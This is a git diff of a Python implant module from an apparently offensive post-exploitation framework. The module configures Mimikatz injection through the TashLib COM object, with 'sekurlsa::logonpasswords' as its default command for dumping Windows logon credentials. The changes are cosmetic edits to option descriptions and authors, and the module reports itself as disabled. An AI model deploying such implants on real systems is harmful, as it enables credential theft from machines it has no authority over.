@@ -81,34 +81,34 @@ class TashLibShellcodeJob(core.job.Job):
 class TashLibShellcodeImplant(core.implant.Implant):
 
     NAME = "Mimikatz via TashLib"
-    DESCRIPTION = "Executes arbitrary shellcode using the TashLib COM object"
-    AUTHORS = ["entynetproject", "Aleph-Naught-" "gentilwiki"]
+    DESCRIPTION = "Executes arbitrary shellcode using the TashLib COM object."
+    AUTHORS = ["Entynetproject"]
     STATE = "implant/inject/mimikatz_tashlib"
 
     def load(self):
-        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on session", required=False)
+        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory on session.", required=False)
 
         self.options.register("MIMICMD", "sekurlsa::logonpasswords", "What Mimikatz command to run?", required=True)
 
-        self.options.register("SHIMX86DLL", "data/bin/mimishim.dll", "relative path to mimishim.dll", required=True, advanced=True)
-        self.options.register("SHIMX64DLL", "data/bin/mimishim.x64.dll", "relative path to mimishim.x64.dll", required=True, advanced=True)
-        self.options.register("MIMIX86DLL", "data/bin/powerkatz32.dll", "relative path to powerkatz32.dll", required=True, advanced=True)
-        self.options.register("MIMIX64DLL", "data/bin/powerkatz64.dll", "relative path to powerkatz64.dll", required=True, advanced=True)
+        self.options.register("SHIMX86DLL", "data/bin/mimishim.dll", "Relative path to mimishim.dll.", required=True, advanced=True)
+        self.options.register("SHIMX64DLL", "data/bin/mimishim.x64.dll", "Relative path to mimishim.x64.dll.", required=True, advanced=True)
+        self.options.register("MIMIX86DLL", "data/bin/powerkatz32.dll", "Relative path to powerkatz32.dll.", required=True, advanced=True)
+        self.options.register("MIMIX64DLL", "data/bin/powerkatz64.dll", "Relative path to powerkatz64.dll.", required=True, advanced=True)
 
-        self.options.register("TASHLIBDLL", "data/bin/TashLib.dll", "relative path to TashLib.dll", required=True, advanced=True)
-        self.options.register("TASHLIBMANIFEST", "data/bin/TashLib.manifest", "relative path to TashLib.manifest", required=True, advanced=True)
+        self.options.register("TASHLIBDLL", "data/bin/TashLib.dll", "Relative path to TashLib.dll.", required=True, advanced=True)
+        self.options.register("TASHLIBMANIFEST", "data/bin/TashLib.manifest", "Relative path to TashLib.manifest.", required=True, advanced=True)
 
-        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID", advanced=True)
+        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID.", advanced=True)
 
-        self.options.register("DLLUUID", "", "HTTP header for UUID", hidden=True)
-        self.options.register("MANIFESTUUID", "", "UUID", hidden=True)
-        self.options.register("SHIMX64UUID", "", "UUID", hidden=True)
-        self.options.register("MIMIX64UUID", "", "UUID", hidden=True)
-        self.options.register("MIMIX86UUID", "", "UUID", hidden=True)
+        self.options.register("DLLUUID", "", "HTTP header for UUID.", hidden=True)
+        self.options.register("MANIFESTUUID", "", "UUID.", hidden=True)
+        self.options.register("SHIMX64UUID", "", "UUID.", hidden=True)
+        self.options.register("MIMIX64UUID", "", "UUID.", hidden=True)
+        self.options.register("MIMIX86UUID", "", "UUID.", hidden=True)
 
-        self.options.register("SHIMX86BYTES", "", "calculated bytes for arr_DLL", hidden=True)
+        self.options.register("SHIMX86BYTES", "", "Calculated bytes for arr_DLL.", hidden=True)
 
-        self.options.register("SHIMX86OFFSET", "6202", "Offset to the reflective loader", advanced = True)
+        self.options.register("SHIMX86OFFSET", "6202", "Offset to the reflective loader.", advanced = True)
 
     def job(self):
         return TashLibShellcodeJob
@@ -130,7 +130,7 @@ class TashLibShellcodeImplant(core.implant.Implant):
         return ret
 
     def run(self):
-        print("Currently disabled, see: https://github.com/entynetproject/entypreter/issues/86")
+        print("Currently disabled, see: https://github.com/entynetproject/entypreter/issues")
 
         import uuid
         self.options.set("DLLUUID", uuid.uuid4().hex)
